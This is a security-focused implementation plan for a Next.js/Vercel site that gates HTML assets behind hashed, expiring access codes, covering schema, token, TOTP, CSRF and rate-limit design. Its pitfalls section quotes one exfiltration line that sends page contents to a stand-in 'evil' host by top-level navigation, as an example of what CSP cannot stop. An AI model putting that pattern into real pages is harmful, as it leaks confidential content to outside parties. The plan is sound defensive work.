# Gated Asset Sharing Site — Implementation Plan

> **Platform note (2026-07-02):** this plan targets **Vercel/Next.js/Neon** and remains current for
> the Vercel deployment. A parallel plan for the **Cloudflare Workers/D1** deployment of the same
> design lives at [`2026-07-02-gated-asset-sharing-site-cloudflare-plan.md`](2026-07-02-gated-asset-sharing-site-cloudflare-plan.md)
> (spec: [`…-design.cloudflare.md`](../design/2026-07-02-gated-asset-sharing-site-design.cloudflare.md)).
> Different plans for different deployments — neither supersedes the other. Both implement the same
> security model; keep security-relevant fixes in sync across the pair.
> Sync log 2026-07-02: three fixes ported from the Cloudflare sibling's review — CSRF malformed-Origin reject (Task 4.3), jose requiredClaims + exp/cookieExp binding (Task 2.4), strict expiry-input validation (Task 5.2).

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a single-admin Next.js site on Vercel that serves self-contained interactive HTML "assets" gated behind admin-generated access codes (per-recipient, expiring, revocable), published git-natively.

> **Derived from** [`docs/design/2026-07-01-gated-asset-sharing-site-design.REVISED.md`](../design/2026-07-01-gated-asset-sharing-site-design.REVISED.md) (the authoritative, security-hardened spec). Supersedes `2026-07-01-…-plan.md` (which targeted the pre-hardening design); the differences this plan encodes are cataloged in [`…-plan-vs-design-gap.md`](2026-07-01-gated-asset-sharing-site-plan-vs-design-gap.md).

**Architecture:** One Next.js (App Router) app. A `/a/[slug]` route handler validates a `?code=` via a **single atomic conditional `UPDATE … RETURNING`** (validate + record usage + compute the DB-time cookie expiry in one statement), sets a signed HttpOnly asset cookie, and 302-redirects to a clean URL; subsequent loads re-check the code-id in Postgres (fail-closed) to keep revocation instant. **Access codes are stored only as `SHA-256(code)` — the raw code is never persisted** (shown once at generation). A password+TOTP-gated `/admin` panel mints/revokes codes. Assets live as `assets/<slug>/index.html` folders read from the serverless bundle; a build step produces a **confidential, non-served manifest** and enforces a **generator registry** for slug provenance. Codes live in Vercel Postgres (Neon) via Drizzle. Every protected route renders **per-request only (no static surface, spec §4 D5)**.

**Tech Stack:** Next.js 15 (App Router, TypeScript), Vercel, Vercel Postgres (Neon) + `@neondatabase/serverless` (short query timeout), Drizzle ORM + drizzle-kit, `jose` (versioned `{v,kid}` canonical tokens over a **key ring**, HMAC-SHA256), `otpauth` (TOTP), `@node-rs/argon2` (argon2id — memory-hard), Node `crypto` (CSPRNG codes/slugs + `SHA-256` code hashing), Vitest (unit + DB-integration tests).

---

## Living Document Contract

This plan is a living document. Every executing agent MUST update it as
execution progresses, not only at completion.

- **On phase claim:** the executor MUST flip the banner to 🚧 IN PROGRESS
  with a claim timestamp (ISO 8601 UTC) and the active branch name. The
  banner MUST NOT include an expected-completion estimate — agents cannot
  reliably estimate their own wall-clock, and a fabricated duration
  becomes a stale anchor that misleads future readers. Followers
  encountering a 🚧 banner determine liveness by observable signals (PR
  existence, recent branch commits), not by arithmetic on expected times.
  See Step 5's stale-claim reclaim protocol.
- **On phase ship:** the executor MUST update that phase's **Execution
  Status** banner with the shipped commit SHA(s) and date. If a PR is
  open, the PR number and URL MUST appear in the top-of-plan Execution
  Status table.
- **On phase defer:** the executor MUST update the banner with ⏸ status
  AND a prose description of the unblock condition + a link to the
  likely-unblocker artifact (plan page, task, or PR whose own Execution
  Status banner will signal completion). Prose + link is durable across
  paraphrases and scope edits; exact-string coordination between agents
  is not.
- **On PR merge:** the executor MUST record the merge SHA in the banner
  + the top-of-plan Execution Status table.
- **On deviation from the written plan** (scope edits, structural
  refactors, dropped tasks, reordered phases): the executor MUST
  inline-document the deviation in the affected task AND summarize it
  in the top-of-plan Execution Status as a "Deviations" subsection.
  Deviation state MUST NOT live only in PR notes or status reports.
- **On discovery** (pre-existing drift surfaced during execution, new
  bugs found, architectural issues noted): the executor MUST add a
  "Discoveries" subsection at the top of the plan with pointers to the
  files/lines affected. Follow-up dispatches read this subsection to
  avoid duplicate discovery work.

The plan SHOULD reflect reality at the end of every session that touches
it. Anything worth putting in a status report to the user is worth
putting in the plan.

Rationale: `/writing-plans-enhanced` Step 5. Writing at ship time is
cheap; reconstruction by downstream readers is expensive, compounds
across dispatches, and fails silently when state is split across PR
notes and commit messages.

---

## Execution Status

**Overall:** Not started.

| Phase | Status | Ship SHA(s) | Notes |
|---|---|---|---|
| 0 — Foundation & pitfalls docs | ⬜ Not started | — | — |
| 1 — Bundling spike (risk-first) | ⬜ Not started | — | gates all disk-read work |
| 2 — DB schema & core code logic | ⬜ Not started | — | — |
| 3 — Gate route, cookie, headers | ⬜ Not started | — | — |
| 4 — Admin auth (password + TOTP) | ⬜ Not started | — | — |
| 5 — Admin panel UI | ⬜ Not started | — | — |
| 6 — Asset pipeline (generator + manifest) | ⬜ Not started | — | — |
| 7 — Deploy pipeline & isolation | ⬜ Not started | — | — |

### Deviations
- _(none yet)_

### Discoveries
- _(none yet)_

---

## Conventions (read before any task)

- **Spec:** [`docs/design/2026-07-01-gated-asset-sharing-site-design.REVISED.md`](../design/2026-07-01-gated-asset-sharing-site-design.REVISED.md) — the **authoritative, security-hardened** design. Every "spec §N" reference below points there (NOT the superseded original). When in doubt, the REVISED spec wins.
- **Package manager:** `npm` (Node 24). **Test runner:** Vitest — `npm test` runs `vitest run`. DB-integration tests run against a disposable local Postgres / Neon branch (see Task 0.3 + `docs/pitfalls/testing-pitfalls.md`).
- **File layout:**
  - `src/lib/db/{schema.ts,client.ts}` — Drizzle schema + Neon client (short query timeout)
  - `src/lib/{codes.ts,ratelimit.ts}` — code gen + `SHA-256` hashing, bucketed rate limiting
  - `src/lib/crypto/tokens.ts` — versioned `{v,kid}` canonical signed tokens over a **key ring** (jose)
  - `src/lib/auth/{password.ts,totp.ts,session.ts}` — admin auth (argon2id; TOTP-after-password)
  - `src/lib/http/headers.ts` — **one** shared security-header builder for every response class
  - `src/app/a/[slug]/route.ts` — gate route handler (atomic redemption; preview-gated)
  - `src/app/admin/**` — admin pages + server actions
  - `src/middleware.ts` — admin guard + CSP + production gate
  - `scripts/{new-asset.mjs,build-manifest.mjs}` — CLI + build step
  - `assets/<slug>/index.html` — asset bodies (served via the function only)
  - `.generated/assets-manifest.json`, `.generated/slugs.json` — **confidential, NON-served** manifest + slug provenance registry (bundled into lambdas, never routable, gitignored)
- **Env vars** (spec §10): `ADMIN_PASSWORD_HASH` (argon2id), `ADMIN_TOTP_SECRET`, `SESSION_SECRET`, `ASSET_COOKIE_SECRET` (both signed as **key rings** — `<kid>:<secret>` entries, comma-separated, current kid first), `PRODUCTION_ORIGIN` (e.g. `https://share.example.com`, for the CSRF check), `DATABASE_URL` (Neon). Tests use a committed `.env.test` with dummy values incl. a **real** argon2id test hash (see Task 0.3).
- **Spec D5 (no static surface) is load-bearing:** every protected route (`/a/[slug]`, `/admin/*`) MUST be `export const dynamic = "force-dynamic"`, and the DB client MUST connect lazily (never at module import) — `next build` imports route modules with no `DATABASE_URL`. See `docs/pitfalls/implementation-pitfalls.md`.

---

## Open owner decisions (spec §15) — surfaced, not silently foreclosed

The design left three decisions to the owner. This plan implements a **default** for each and keeps a
seam so the alternative is a localized change, not a rewrite. Confirm or change each before shipping:

- **§15 Q1 — reusable code in the URL.** Default: the query-string model (`/a/<slug>?code=…`), read in
  ONE place (`req.nextUrl.searchParams.get("code")` in Task 3.2) and minted in ONE place (Task 5.2).
  Alternative (short-lived one-time redemption token, or fragment + same-origin POST) would change only
  those two sites + the limiter keying. Recommend at least the fragment approach if platform-log
  leakage is a real concern (spec §3 D4).
- **§15 Q2 — sandboxed-iframe rendering.** Default: the asset HTML is rendered directly in the top frame
  (Task 3.2). §15 *promotes* sandboxed-iframe rendering (no `allow-top-navigation`) from YAGNI to a
  **recommended reconsideration** — the CSP cannot stop top-level-navigation exfiltration and
  "trusted admin" covers malice, not authoring mistakes. If adopted, keep the access cookie scoped to
  the parent route, not the iframe. This is a conscious owner decision, NOT settled scope.
- **§15 Q3 — how to gate `/a/*` on preview.** Default: return the generic page on preview (Task 3.2) and
  QA the gate in `vercel dev`/local. Alternative: a preview-only shared secret (Task 7.1). Either way
  the preview DB MUST be schema-only, never branched from prod (Task 7.1).
- **Every task is TDD.** The per-task blocks below are mandatory, not optional.
- **Phase-completion review (applies to every phase's "BEFORE marking … complete" gate):** review the phase's batch of changes from multiple perspectives across a **minimum of 3 review rounds**; if the 3rd round still finds substantive issues, keep going until a round is clean. At minimum cover: security invariants (negative paths, fail-closed), spec conformance, and cross-task type/name consistency.
- **Assertion rigor (all timing/DB/concurrency tests — esp. Phases 3–4):** if a test races or flakes, fix it with deterministic synchronization or a controlled clock/fake — **never** by removing or weakening the assertion. If it can't be made deterministic, STOP and raise. Commit subjects touching assertions MUST say add/strengthen/preserve (or explicitly "weaken" + why); "stabilization" is banned. See `docs/pitfalls/testing-pitfalls.md`.

---

## Phase 0 — Foundation & pitfalls docs

**Execution Status:** ⬜ NOT STARTED

> Why this phase first: establishes the toolchain, the test harness every later task depends on, and the project-specific pitfalls docs the TDD blocks reference. The pitfalls docs are seeded from the **REVISED** design's security review (spec §3/§5/§7/§8/§9/§10/§11).

### Task 0.1: Seed the pitfalls docs

**Files:**
- Create: `docs/pitfalls/implementation-pitfalls.md`
- Create: `docs/pitfalls/testing-pitfalls.md`

- [ ] **Step 1: Create `docs/pitfalls/implementation-pitfalls.md`** with this content:

```markdown
# Implementation Pitfalls (project-specific)

Traps surfaced by the design's 6-round security review. Re-read before implementing related code.
Source of truth: `docs/design/2026-07-01-gated-asset-sharing-site-design.REVISED.md`.

## Store SHA-256(code), never the raw code (spec §3 D3, §5, §8)
The `codes` table stores `code_hash` ONLY — the raw code is NEVER persisted. Redemption looks up by
`SHA-256(code)`. The admin panel reveals the raw code/link exactly ONCE at generation (API-key
style); it is unrecoverable afterward. A plaintext `code` column, or an admin list that rebuilds a
`?code=` link per row, silently leaks live reusable bearer codes on any DB read/backup/export.

## Redemption is ONE atomic conditional UPDATE (spec §6 step 4)
Validate + `use_count+1` + `last_used_at=now()` + compute `cookie_exp` in a SINGLE statement:
`UPDATE codes SET use_count = use_count+1, last_used_at = now() WHERE code_hash=$1 AND
revoked_at IS NULL AND expires_at > now() AND asset_slug=$2 RETURNING id,
LEAST(now()+interval '24 hours', expires_at) AS cookie_exp`. Issue the cookie IFF a row returns;
fail closed on error. Never check-then-write — a revoke can slip between the read and the write.

## DB is the single time source (spec §5)
Every expiry/validity/usage comparison and default uses DB `now()`, never serverless
`new Date()`/`Date.now()` (clocks drift across regions). The 90-day default is a DB column default
`DEFAULT (now() + interval '90 days')`. All time columns are `TIMESTAMPTZ`. JS time is display-only.

## No static surface — force-dynamic + lazy DB (spec §4 D5, §7)
Every protected route is DB-gated + fail-closed, so nothing sensitive may be prerendered/edge-cached.
Mark `/a/[slug]` and every `/admin/*` route `export const dynamic = "force-dynamic"`. The Neon client
MUST connect LAZILY on first query, never at module import: `next build` imports route modules while
`DATABASE_URL` is unset, so eager `neon(url)` at module load throws during the build. Symptom if
violated: `next build` fails "DATABASE_URL is not set", or a gated page serves from a stale cache.

## Fail closed on DB error (spec §3, §6)
The per-load recheck MUST deny when the DB is unreachable — never serve from the cookie alone (a
revoked code would work during an outage). Use `@neondatabase/serverless` (HTTP) with a short
per-query timeout (`AbortSignal.timeout`) so a blip fails fast rather than hanging.

## The access code is the entire secret (spec §3)
Never log the raw `?code=` or `req.url`. Bind the asset cookie to `{v,kid,slug,code_id,iat,cookie_exp}`
only — nothing JS-readable, never the code. Never place asset HTML OR the manifest under `/public`.
Strip `?code=` via the 302.

## Signed tokens: versioned, canonical, key-ring (spec §6 step 4, §8, §10)
Asset + session tokens carry `{v, kid, …}` with canonical encoding and strict schema validation
(reject unknown/missing/duplicate fields, unrecognized v/kid). `SESSION_SECRET` and
`ASSET_COOKIE_SECRET` are KEY RINGS: sign with the current kid, verify against current+previous,
reject retired keys. Rotation is graceful, not a flag-day swap. Rotating a secret is NOT the response
to suspected code exposure — that is revoke + reissue the affected codes.

## Cookie lifetime capped by code expiry (spec §6 step 4)
`cookie_exp = LEAST(now()+24h, code.expires_at)`, returned from the atomic UPDATE on DB time. A fixed
24h TTL that ignores a soon-to-expire code is wrong.

## Confidential manifest at a NON-served path + generator registry (spec §7)
The slug→title map aggregates client identities: write it to `.generated/assets-manifest.json`
(OUTSIDE `assets/`), bundled into lambdas but never routable. `new-asset` appends each minted slug to
`.generated/slugs.json`; the build REJECTS any asset folder whose slug is absent from that registry —
the registry, not the shape regex, is the D2 backstop. The external-origin scan is an advisory lint;
CSP is the real containment boundary (§9), so do not present the scan as enforcement.

## Trace confidential server-only files into EVERY consumer lambda (spec §7)
Files read from disk at request time are bundled only if listed in `outputFileTracingIncludes` for
each function that reads them — the manifest is read by BOTH `/a/[slug]` and `/admin`. A file that
"works in dev" 404s/empties in prod if it isn't traced into that specific route's lambda.

## Bootstrap hash must be byte-compatible with the runtime verifier (spec §8)
The `hash-password` helper and the login verifier MUST produce/consume the identical argon2id
encoding (params + serialization). Share ONE hashing module between them; never re-implement the
format in the script, or the admin's own correct password is rejected with no obvious cause.

## TOTP: consume the step only AFTER the password verifies (spec §5, §8)
`verifyTotp` marks the matched step used — call it ONLY after the password check passes, else a
wrong-password attempt burns steps / probes replay state. Replay-rejection needs the
`totp_used_steps` table (serverless has no shared memory); prune rows older than the ±1 window.

## CSRF: pin the production origin; reject missing (spec §8)
Compare `Origin` to `PRODUCTION_ORIGIN` (NOT the request's own `Host`). If `Origin` is absent, fall
back to a `Referer` same-origin check; treat cross-site / malformed / missing-without-fallback as
reject. `Sec-Fetch-Site` is corroboration only.

## Rate limiting: bucket unknown slugs; exempt ≠ unauthorized; never lock out (spec §9)
Bucket malformed/non-manifest slugs into fixed keys (`bad-shape`, `unknown-slug`) so a random-slug
spray can't mint unbounded `rate_limits` rows; only manifest slugs get a per-slug key. Limit
unauthenticated traffic (redemptions + no-valid-cookie loads) AND keep a generous global
circuit-breaker. A signature-valid-cookie load is limiter-EXEMPT but STILL DB-rechecked (limiter
skip is never an authorization skip). The login limiter throttles/backs off — a hard lockout on a
single-admin site is a self-inflicted DoS. Increment atomically
(`INSERT … ON CONFLICT (key) DO UPDATE SET count = count + 1`) on DB time.

## Preview gates /a/* AND uses a schema-only DB (spec §10, §11, §15 Q3)
Admin-production-only is NOT enough — preview bundles + serves confidential asset HTML. Gate `/a/*`
on preview too (generic page or a preview-only secret), and provision the preview Neon DB as an EMPTY
schema — never a branch cloned from prod (a Neon branch copies real valid codes into a less-trusted
environment).

## Admin is production-only, failing CLOSED (spec §8, §11)
`/admin/*` is inert UNLESS `VERCEL_ENV === 'production'` — a positive allow, so an unset/empty env is
inert (fail-closed), not treated as production. The inert response is the SAME generic failure page
as the gate, not a distinguishable body.

## CSP cannot stop top-level-navigation exfiltration (spec §9, §15 Q2)
The `'self'` CSP blocks background beaconing, NOT `window.location = 'https://evil/#'+body`. Accepted
for trusted admin authoring, but §15 Q2 promotes sandboxed-iframe rendering to a *recommended
reconsideration* — direct top-frame render is a conscious owner decision, not settled YAGNI.
```

- [ ] **Step 2: Create `docs/pitfalls/testing-pitfalls.md`** with this content:

```markdown
# Testing Pitfalls (project-specific)

## Do not weaken assertions to fix flakes
If a timing/DB/concurrency test races or flakes, the fix is deterministic synchronization
(await a real signal, seed the DB deterministically, control the clock) — NOT deleting or
loosening the assertion. If you cannot make it deterministic, STOP and raise it. A commit that
touches assertions MUST say in its subject what happened to them (add/strengthen/preserve, or
explicitly "weaken" + why). "test stabilization" as a subject is banned.

## Test the security invariants, not just the happy path
For every gate/auth feature, the negative test is the important one: expired code denied,
revoked code denied on the NEXT load, wrong TOTP denied, DB-down denied, unknown-slug and
bad-code responses byte-identical. A feature without its negative tests is not done.

## Some invariants need a REAL DB (unit tests with fakes can't prove them)
The atomic redemption UPDATE, the atomic rate-limit increment, DB-side defaults, DB-`now()` time
source, and revoke-vs-redeem races are only proven against a real Postgres (local or a disposable
Neon branch), seeded deterministically. Cover: (a) redemption is one conditional UPDATE — a code
revoked between "would-validate" and the write is denied with no dangling `use_count` increment;
(b) concurrent redemptions don't lose `use_count`; (c) a random-slug spray does NOT create unbounded
`rate_limits` rows (bucketed); (d) the 90-day default comes from the DB, not JS.

## Assert the security PROPERTIES, not just behavior
Add explicit tests for: **no plaintext code column** (introspect the schema / assert redemption
looks up by `SHA-256(code)`); **a wrong password + valid TOTP does NOT consume the TOTP step**;
**argon2id** verification (reject a fast-hash impl); **key-ring rotation** — a token signed with the
previous kid still verifies during the window, one signed with a retired kid is rejected, and
unknown-v / extra-field payloads are rejected.

## Assert the full header/cookie contract on EVERY response class
One test suite hits the redemption 302, the asset 200, the failure page, and an admin response and
asserts EVERY header (`Cache-Control: no-store`, `Pragma`, `Referrer-Policy`, `X-Robots-Tag`,
`X-Content-Type-Options`, full CSP incl. `frame-ancestors 'none'`/`object-src`/`frame-src`/
`worker-src`, HSTS), the asset-cookie attributes (`HttpOnly`/`Secure`/`SameSite=Lax`/`Path=/a/<slug>`),
and that the post-redirect clean URL carries no `?code=`. Also assert the three manifest URLs 404.

## Cover the request-level compositions (not just lib functions)
Route/middleware/action behavior is invisible to unit tests of the libs: `?code=` overriding an
existing cookie (precedence); traversal/malformed slug rejected before DB/FS; expired-cookie load
returns the generic page then re-redeems; `/a/*` gated on preview (`VERCEL_ENV`); `/admin/*`
redirects to login without a session and is inert on preview; login rejects wrong password OR wrong
TOTP; a mutation with a bad/absent Origin is rejected; a valid-cookie load is limiter-exempt but
still DB-rechecked.

## Control time; never sleep
Expiry, TOTP steps, and rate-limit windows are time-dependent. In UNIT tests inject a clock / fake
timers (`vi.useFakeTimers()` / pass `now`); in DB-integration tests rely on DB `now()` and seed rows
with explicit timestamps. Never `setTimeout`-sleep.

## Enumeration parity is about failure-vs-failure only
Assert unknown-slug and bad-code return identical body+status+headers. Do NOT assert
success-vs-failure indistinguishability — success is a 302 and is meant to differ (spec §3).

## Commit a dummy `.env.test` so a fresh worktree runs green
Tests need env values at run time. Commit `.env.test` with dummy, non-prod values (plus a
`.gitignore` negation so it is tracked). The committed `ADMIN_PASSWORD_HASH` MUST be a REAL argon2id
hash of a known test password (generated once via the helper), not a placeholder — login-flow tests
that verify against a placeholder verify against garbage.
```

- [ ] **Step 3: Commit**

```bash
git add docs/pitfalls/
git commit -m "docs: seed project pitfalls docs from design review"
```

### Task 0.2: Scaffold the Next.js app

**Files:**
- Create: whole Next.js skeleton (via CLI), `next.config.ts`, `.gitignore` additions
- Create: `.nvmrc`

- [ ] **Step 1: Scaffold into a temp dir, then merge without clobbering existing files.** Flag names vary across `create-next-app` versions; if a flag is rejected, answer the interactive prompts to match: **TypeScript = yes, App Router = yes, `src/` dir = yes, Tailwind = no, ESLint = yes, import alias = `@/*`, Turbopack = no**. The repo already has `.git/`, `docs/`, and `README.md` — do NOT let the scaffold overwrite them.

```bash
npx create-next-app@latest /tmp/gated-app --ts --app --eslint --src-dir --no-tailwind --import-alias "@/*" --use-npm
# Merge everything EXCEPT files we already own (README.md, docs/, .git/):
rsync -a --exclude='.git' --exclude='README.md' --exclude='docs' /tmp/gated-app/ ./
rm -rf /tmp/gated-app
node -v | sed 's/^v//' > .nvmrc   # bare version, no leading "v"
```

If `create-next-app` created its own `.gitignore`, keep it (later tasks append to it).

- [ ] **Step 2: Verify dev server boots**

Run: `npm run dev` then in another shell `curl -sS -o /dev/null -w "%{http_code}\n" http://localhost:3000`
Expected: `200`. Stop the dev server (Ctrl-C).

- [ ] **Step 3: Set the root page to a neutral blank page** (spec §9 — no enumeration).

Replace `src/app/page.tsx` with:

```tsx
export default function Home() {
  return null;
}
```

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "chore: scaffold Next.js app (App Router, TS, src dir)"
```

### Task 0.3: Install deps + wire Vitest

**Files:**
- Modify: `package.json` (deps + scripts)
- Create: `vitest.config.ts`, `.env.test`, `src/test/setup.ts`

- [ ] **Step 1: Install runtime + dev deps**

```bash
npm i drizzle-orm @neondatabase/serverless jose otpauth @node-rs/argon2
npm i -D drizzle-kit vitest @vitest/coverage-v8 dotenv
```

> `@node-rs/argon2` is a prebuilt native argon2id binding (no build toolchain needed on Vercel). The
> design names argon2id specifically (spec §8); do NOT substitute a fast hash or Node `scrypt`.

- [ ] **Step 2: Create `vitest.config.ts`**

```ts
import { defineConfig } from "vitest/config";
import { fileURLToPath } from "node:url";

export default defineConfig({
  test: {
    environment: "node",
    setupFiles: ["src/test/setup.ts"],
    include: ["src/**/*.test.ts", "scripts/**/*.test.ts"],
  },
  resolve: {
    alias: { "@": fileURLToPath(new URL("./src", import.meta.url)) },
  },
});
```

- [ ] **Step 3: Create `.env.test`** (dummy secrets — safe to commit; never used in prod):

```
DATABASE_URL=postgres://test:test@localhost:5432/test
SESSION_SECRET=k1:test-session-secret-do-not-use-in-prod-0000000000
ASSET_COOKIE_SECRET=k1:test-asset-secret-do-not-use-in-prod-00000000000
PRODUCTION_ORIGIN=http://localhost:3000
# Placeholder until Task 4.1 Step 6 overwrites it with a REAL argon2id hash of the test
# password "test-password". Login-flow tests (Task 4.3) depend on the real value; do not
# ship this placeholder — see docs/pitfalls/testing-pitfalls.md ("Commit a dummy .env.test").
ADMIN_PASSWORD_HASH=PLACEHOLDER-REPLACED-IN-TASK-4.1
ADMIN_TOTP_SECRET=JBSWY3DPEHPK3PXP
```

> Secrets are **key rings** — `<kid>:<secret>` entries (comma-separated for multiple; current kid
> first). `k1:` here is the single current key. See Task 2.4 for the ring parser.

`.env.test` MUST be committed (a fresh worktree needs it or `npm test` fails). create-next-app's `.gitignore` ignores env files, so add a negation so this one file is tracked — append to `.gitignore`:

```
!.env.test
```

Verify with `git check-ignore .env.test` → should print **nothing** (not ignored). If it's still ignored, `git add -f .env.test`.

- [ ] **Step 4: Create `src/test/setup.ts`**

```ts
import { config } from "dotenv";
config({ path: ".env.test" });
```

- [ ] **Step 5: Add scripts to `package.json`** (`scripts` block):

```json
"test": "vitest run",
"test:watch": "vitest",
"db:generate": "drizzle-kit generate",
"db:migrate": "drizzle-kit migrate",
"new-asset": "node scripts/new-asset.mjs",
"build-manifest": "node scripts/build-manifest.mjs"
```

- [ ] **Step 5b: Keep tests + scripts out of the Next build type-check.** create-next-app's `tsconfig.json` includes `**/*.ts`, so `next build` would type-check Vitest files (and the `.mjs` import in Task 6.2), likely failing the build. Add `exclude` entries to `tsconfig.json` (merge with any existing `exclude` — keep `node_modules`):

```json
"exclude": ["node_modules", "**/*.test.ts", "scripts/**"]
```

(Vitest runs tests via its own config and is unaffected by this exclude.)

- [ ] **Step 6: Add a smoke test** `src/test/smoke.test.ts`:

```ts
import { expect, test } from "vitest";
test("env loads", () => { expect(process.env.SESSION_SECRET).toBeTruthy(); });
```

- [ ] **Step 7: Run tests**

Run: `npm test`
Expected: PASS (1 test).

- [ ] **Step 8: Commit**

```bash
git add -A
git commit -m "chore: add drizzle, jose, otpauth, vitest test harness"
```

**BEFORE marking Phase 0 complete:** update this phase's banner to ✅ SHIPPED with SHA/date; flip the Execution Status table row.

---

## Phase 1 — Bundling spike (RISK-FIRST)

**Execution Status:** ⬜ NOT STARTED

> Why now: spec §12 mandates proving `assets/**` is readable from the **deployed** lambda before any real gate logic is built on disk reads. This is the single highest-risk assumption. **Do NOT proceed to Phase 3 until this phase is ✅ and verified on a real Vercel URL.** Read `docs/pitfalls/implementation-pitfalls.md` → "Serverless file bundling" first.

### Task 1.1: Prove disk reads work in a deployed lambda

**Files:**
- Create: `assets/spike00000000000000000/index.html` (throwaway; 22-char slug)
- Create: `src/app/a/[slug]/route.ts` (spike version)
- Modify: `next.config.ts`

- [ ] **Step 1: Create the throwaway asset** `assets/spike00000000000000000/index.html`:

```html
<!doctype html><title>Spike</title><h1>bundling spike ok</h1>
```

- [ ] **Step 2: Configure file tracing** in `next.config.ts`:

```ts
import type { NextConfig } from "next";
import path from "node:path";

const nextConfig: NextConfig = {
  outputFileTracingIncludes: {
    "/a/[slug]": ["./assets/**/*.html"],
  },
  outputFileTracingRoot: path.join(process.cwd()),
};
export default nextConfig;
```

- [ ] **Step 3: Create the spike route** `src/app/a/[slug]/route.ts`:

```ts
import { readFile } from "node:fs/promises";
import path from "node:path";

export const dynamic = "force-dynamic";

export async function GET(
  _req: Request,
  { params }: { params: Promise<{ slug: string }> },
) {
  const { slug } = await params;
  if (!/^[A-Za-z0-9_-]{22}$/.test(slug)) return new Response("nope", { status: 404 });
  const file = path.join(process.cwd(), "assets", slug, "index.html");
  try {
    const html = await readFile(file, "utf8");
    return new Response(html, { headers: { "content-type": "text/html; charset=utf-8" } });
  } catch {
    return new Response("nope", { status: 404 });
  }
}
```

- [ ] **Step 4: Verify locally**

Run: `npm run dev` then `curl -sS http://localhost:3000/a/spike00000000000000000`
Expected: HTML containing `bundling spike ok`. Stop dev server.

- [ ] **Step 5: Deploy a preview and verify in prod runtime.** (Requires Vercel CLI + linked project — if not yet linked, run `npx vercel link` first; a Vercel account exists per project brief.)

```bash
npx vercel pull --yes            # pull project settings
npx vercel deploy                # preview deploy; prints a URL
# Then:
curl -sS "<preview-url>/a/spike00000000000000000"
```

Expected: HTML containing `bundling spike ok` **served from the deployed lambda**.
**If this 404s:** the slug is a valid 22-char slug, so a 404 means the include glob is wrong (NOT the regex). Try the route-file key form `outputFileTracingIncludes: { "src/app/a/[slug]/route": ["./assets/**"] }`, redeploy, re-curl. Record whichever form works in the plan's Discoveries subsection.

- [ ] **Step 6: Record the outcome** in the top-of-plan **Discoveries** subsection: which `outputFileTracingIncludes` key form was verified working on Vercel, and the preview URL used.

- [ ] **Step 7: Commit**

```bash
git add assets/ src/app/a/ next.config.ts
git commit -m "spike: verify assets/** bundles into deployed lambda"
```

**BEFORE marking Phase 1 complete:** the Vercel-URL curl in Step 5 MUST have returned the HTML. If it did not and no include form works, STOP and raise — the disk-read architecture (spec §7) needs revisiting (fallback: build-generated module map importing HTML as strings). Update banner + table.

---

## Phase 2 — DB schema & core code logic

**Execution Status:** ⬜ NOT STARTED

> Pure, DB-light logic with heavy unit tests. Read `docs/pitfalls/testing-pitfalls.md` → "Control time" and "Don't hit the network in unit tests".

### Task 2.1: Drizzle schema + Neon client

**Files:**
- Create: `src/lib/db/schema.ts`, `src/lib/db/client.ts`, `drizzle.config.ts`

- [ ] **Step 1: Write the schema** `src/lib/db/schema.ts` (spec §5):

```ts
import { sql } from "drizzle-orm";
import { bigint, index, integer, pgTable, text, timestamp, uuid } from "drizzle-orm/pg-core";

export const codes = pgTable("codes", {
  id: uuid("id").defaultRandom().primaryKey(),
  // SHA-256(code) hex — the RAW code is NEVER stored (spec §3 D3, §5). Redemption looks up by hash.
  codeHash: text("code_hash").notNull().unique(),
  assetSlug: text("asset_slug").notNull(),
  label: text("label").notNull().default(""),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  // DB-side default = single trusted time source (spec §5). A non-constant default expr is valid PG.
  expiresAt: timestamp("expires_at", { withTimezone: true }).notNull().default(sql`now() + interval '90 days'`),
  revokedAt: timestamp("revoked_at", { withTimezone: true }),
  lastUsedAt: timestamp("last_used_at", { withTimezone: true }),
  useCount: integer("use_count").notNull().default(0),
});

export const totpUsedSteps = pgTable("totp_used_steps", {
  step: bigint("step", { mode: "number" }).primaryKey(),
  usedAt: timestamp("used_at", { withTimezone: true }).notNull().defaultNow(),
});

export const rateLimits = pgTable(
  "rate_limits",
  {
    key: text("key").primaryKey(),
    count: integer("count").notNull().default(0),
    windowStart: timestamp("window_start", { withTimezone: true }).notNull().defaultNow(),
  },
  // Indexed so lazy pruning of stale windows stays cheap (spec §5/§9).
  (t) => ({ windowStartIdx: index("rate_limits_window_start_idx").on(t.windowStart) }),
);
```

> Note: the `codes` table has NO plaintext `code` column — this is a hard invariant (spec §13 asserts it). The 90-day default lives in the DB; JS never computes expiry for the production path.

- [ ] **Step 2: Write the client** `src/lib/db/client.ts` (Neon HTTP driver, fail-fast — see pitfalls "Fail closed"):

```ts
import { neon } from "@neondatabase/serverless";
import { drizzle, type NeonHttpDatabase } from "drizzle-orm/neon-http";
import * as schema from "./schema";

// Lazy init (spec §4 D5): `next build` imports this module with no DATABASE_URL, so we MUST NOT
// connect at module load. A Proxy defers construction to the first actual query.
// Short per-query timeout (spec §6/§10): a DB blip fails fast, so the recheck fails CLOSED
// (a fresh AbortSignal.timeout per fetch — a shared signal would abort only once).
let real: NeonHttpDatabase<typeof schema> | null = null;
function init(): NeonHttpDatabase<typeof schema> {
  if (!real) {
    const url = process.env.DATABASE_URL;
    if (!url) throw new Error("DATABASE_URL is not set");
    const client = neon(url, {
      fetchFunction: (input: RequestInfo | URL, opts?: RequestInit) =>
        fetch(input, { ...opts, signal: AbortSignal.timeout(5000) }),
    });
    real = drizzle(client, { schema });
  }
  return real;
}

export const db = new Proxy({} as NeonHttpDatabase<typeof schema>, {
  get(_t, prop) {
    const d = init() as Record<string | symbol, unknown>;
    const v = d[prop];
    return typeof v === "function" ? (v as (...a: unknown[]) => unknown).bind(d) : v;
  },
});
```

- [ ] **Step 3: Write `drizzle.config.ts`**

```ts
import { defineConfig } from "drizzle-kit";

export default defineConfig({
  schema: "./src/lib/db/schema.ts",
  out: "./drizzle",
  dialect: "postgresql",
  dbCredentials: { url: process.env.DATABASE_URL! },
});
```

- [ ] **Step 4: Generate the initial migration**

Run: `DATABASE_URL=postgres://x npm run db:generate`
Expected: a SQL file appears under `drizzle/`.

- [ ] **Step 5: Commit**

```bash
git add src/lib/db drizzle.config.ts drizzle/
git commit -m "feat: drizzle schema (codes, totp_used_steps, rate_limits) + neon client"
```

### Task 2.2: Code generation

**Files:**
